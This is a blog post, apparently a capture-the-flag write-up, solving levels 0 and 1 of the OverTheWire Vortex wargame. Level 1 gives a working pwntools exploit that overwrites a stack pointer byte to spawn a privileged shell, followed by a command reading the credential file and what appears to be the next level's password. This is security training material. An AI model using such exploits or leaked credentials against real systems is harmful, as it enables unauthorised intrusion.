---
layout: post
title:  "Vortex from OverTheWire"
date:   2024-04-15 00:17:00 +0530
categories: Binary Exploitation, CTFs and Reversing
---

Vortex is a set of challenges consisting of 27 levels on [overthewire.org](https://overthewire.org/wargames/vortex/)

I'll be attempting to solve the challenges and will post the solutions to each level on this very blog post, Starting from
15th April 2024. You can find all the scripts that I write [here](https://github.com/azorfus/azorfus.github.io/tree/blog/resources/overthewire.org/vortex)



## Level 0
Trivial.
```py
# Solution script
import socket
import struct

handle = socket.socket()
connect = handle.connect(("vortex.labs.overthewire.org", 5842))

s = 0
for i in range(0, 4):
	# One unsigned integer is 4 bytes big
	s = s + int(struct.unpack("I", handle.recv(4))[0])

handle.send(struct.pack("I", s))
print(handle.recv(1024))
```

## Level 1
Given source code for `vortex1`:
```c
#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>

#define e(); if(((unsigned int)ptr & 0xff000000)==0xca000000) { setresuid(geteuid(), geteuid(), geteuid()); execlp("/bin/sh", "sh", NULL); printf("%p %p\n", &ptr,ptr); }

void print(unsigned char *buf, int len)
{
	int i;

	printf("[ ");
	for(i=0; i < len; i++) printf("%x ", buf[i]); 
	printf(" ]\n");
}

int main()
{
	unsigned char buf[512];
	unsigned char *ptr = buf + (sizeof(buf)/2);
	unsigned int x;

	while((x = getchar()) != EOF) {
		switch(x) {
			case '\n': print(buf, sizeof(buf)); continue; break;
			case '\\': ptr--; break; 
			default: e(); if(ptr > buf + sizeof(buf)) continue; ptr++[0] = x; break;
		}
	}
	printf("All done\n");
	return 0;
}
```

It seems that we have a 512 byte buffer and a pointer containing a memory address pointing to the center
of the buffer initially. Our objective is to get the first byte of this pointer to be equal to `0xca`.

This is because `X & 0xffffffff = X`.

Upon closer inspection of where the ptr value is stored in stack, we see that it lies above the buffer,
By exploiting the very convinient use of "\\" to move back enough bytes overwriting the first byte of ptr
we get a shell.
```py
from pwn import * 

target = process("/vortex/vortex1")
target.send(261*"\\" + "\xca")
target.interactive()
```

```
$ cat /etc/vortex_pass/vortex2
kPNds22Ru
```

## Level 2
